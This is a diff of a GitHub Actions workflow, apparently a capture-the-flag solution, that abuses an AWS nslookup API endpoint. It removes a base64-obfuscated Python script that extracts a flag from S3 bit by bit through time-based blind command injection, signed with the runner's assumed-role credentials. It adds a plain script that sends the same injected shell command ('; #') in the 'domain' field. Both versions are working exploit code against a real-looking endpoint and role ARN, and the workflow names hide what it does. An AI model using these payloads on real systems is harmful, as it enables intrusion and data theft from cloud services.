@@ -1,9 +1,6 @@
-name: Stage2-Extract-Flag
+name: Stage2-Calibration
 
 on:
-  push:
-    branches:
-      - corgi
   workflow_dispatch:
 
 permissions:
@@ -11,7 +8,7 @@ permissions:
   contents: read
 
 jobs:
-  extract:
+  calibration:
     runs-on: ubuntu-latest
 
     steps:
@@ -21,11 +18,64 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Extract flag
+      - name: Test successful S3 read
         shell: bash
         run: |
-          set +e
           python3 -m pip install boto3 requests requests-aws4auth --quiet
 
-                  printf '%s' 'aW1wb3J0IGJhc2U2NCxzaGxleCx0aW1lLHJlcXVlc3RzLGJvdG8zCmZyb20gcmVxdWVzdHNfYXdzNGF1dGggaW1wb3J0IEFXUzRBdXRoCkFQST0iaHR0cHM6Ly8zcTkzMXN5aTdiLmV4ZWN1dGUtYXBpLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tL2Rldi9uc2xvb2t1cCIKVVJMPSJodHRwczovL3MzLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tL3VzZXJhZDg4ZTJiMTY4YWEzODdlL2ZsYWcudHh0IgpVQT0iQW1hem9uIENsb3VkRnJvbnQiCmlubmVyPSdpbXBvcnQgc3lzLHRpbWUsdXJsbGliLnJlcXVlc3RcbnU9c3lzLmFyZ3ZbMV1cbmE9c3lzLmFyZ3ZbMl1cbmk9aW50KHN5cy5hcmd2WzNdKVxuYj1pbnQoc3lzLmFyZ3ZbNF0pXG5yPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodSxoZWFkZXJzPXsiVXNlci1BZ2VudCI6YX0pXG53aXRoIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocix0aW1lb3V0PTEwKSBhcyB4OlxuICAgIGQ9eC5yZWFkKClcbmlmIGk8bGVuKGQpIGFuZCBkW2ldJigxPDxiKTpcbiAgICB0aW1lLnNsZWVwKDIpXG4nCmU9YmFzZTY0LmI2NGVuY29kZShpbm5lci5lbmNvZGUoKSkuZGVjb2RlKCkKYz1ib3RvMy5TZXNzaW9uKCkuZ2V0X2NyZWRlbnRpYWxzKCkuZ2V0X2Zyb3plbl9jcmVkZW50aWFscygpCmE9QVdTNEF1dGgoYy5hY2Nlc3Nfa2V5LGMuc2VjcmV0X2tleSwidXMtZWFzdC0xIiwiZXhlY3V0ZS1hcGkiLHNlc3Npb25fdG9rZW49Yy50b2tlbikKb3V0PWJ5dGVhcnJheSgpCmZvciBpIGluIHJhbmdlKDk2KToKICAgIHY9MAogICAgZm9yIGIgaW4gcmFuZ2UoOCk6CiAgICAgICAgcT0oInByaW50ZiAnJXMnICIrc2hsZXgucXVvdGUoZSkrInxiYXNlNjQgLWQgPi90bXAvcC5weTtweXRob24zIC90bXAvcC5weSAiK3NobGV4LnF1b3RlKFVSTCkrIiAiK3NobGV4LnF1b3RlKFVBKSsiICIrc3RyKGkpKyIgIitzdHIoYikrIjsjIikKICAgICAgICB0PXRpbWUubW9ub3RvbmljKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoQVBJLGpzb249eyJkb21haW4iOnF9LGF1dGg9YSx0aW1lb3V0PTIwKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgeDoKICAgICAgICAgICAgcHJpbnQoIkVSUiIscmVwcih4KSkKICAgICAgICBkdD10aW1lLm1vbm90b25pYygpLXQKICAgICAgICBpZiBkdD4xOgogICAgICAgICAgICB2fD0xPDxiCiAgICAgICAgcHJpbnQoaSxiLHYscm91bmQoZHQsMiksZmx1c2g9VHJ1ZSkKICAgIGlmIG5vdCB2OgogICAgICAgIGJyZWFrCiAgICBvdXQuYXBwZW5kKHYpCiAgICBwcmludCgiQ0hBUiIsaSxyZXByKGNocih2KSksZmx1c2g9VHJ1ZSkKcHJpbnQoIkZMQUdfVEVYVD0iK291dC5kZWNvZGUoZXJyb3JzPSJyZXBsYWNlIiksZmx1c2g9VHJ1ZSkK' | base64 --decode > /tmp/extract.py
-          python3 /tmp/extract.py
+          python3 - <<'PY'
+          import shlex
+          import time
+          import requests
+          import boto3
+          from requests_aws4auth import AWS4Auth
+
+          API = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
+          S3_URL = "https://s3.us-east-1.amazonaws.com/userad88e2b168aa387e/flag.txt"
+          USER_AGENT = "Amazon CloudFront"
+
+          inner = (
+              "import sys,time,urllib.request;"
+              "u=sys.argv[1];"
+              "a=sys.argv[2];"
+              "r=urllib.request.Request(u,headers={'User-Agent':a});"
+              "d=urllib.request.urlopen(r,timeout=10).read();"
+              "print('READ_BYTES='+str(len(d)));"
+              "time.sleep(2)"
+          )
+
+          credentials = boto3.Session().get_credentials().get_frozen_credentials()
+
+          auth = AWS4Auth(
+              credentials.access_key,
+              credentials.secret_key,
+              "us-east-1",
+              "execute-api",
+              session_token=credentials.token
+          )
+
+          command = (
+              "python3 -c "
+              + shlex.quote(inner)
+              + " "
+              + shlex.quote(S3_URL)
+              + " "
+              + shlex.quote(USER_AGENT)
+              + "; #"
+          )
+
+          started = time.monotonic()
+
+          response = requests.post(
+              API,
+              json={"domain": command},
+              auth=auth,
+              timeout=20
+          )
+
+          elapsed = time.monotonic() - started
+
+          print("HTTP=" + str(response.status_code))
+          print("ELAPSED=%.2f" % elapsed)
+          print(response.text)
+          PY
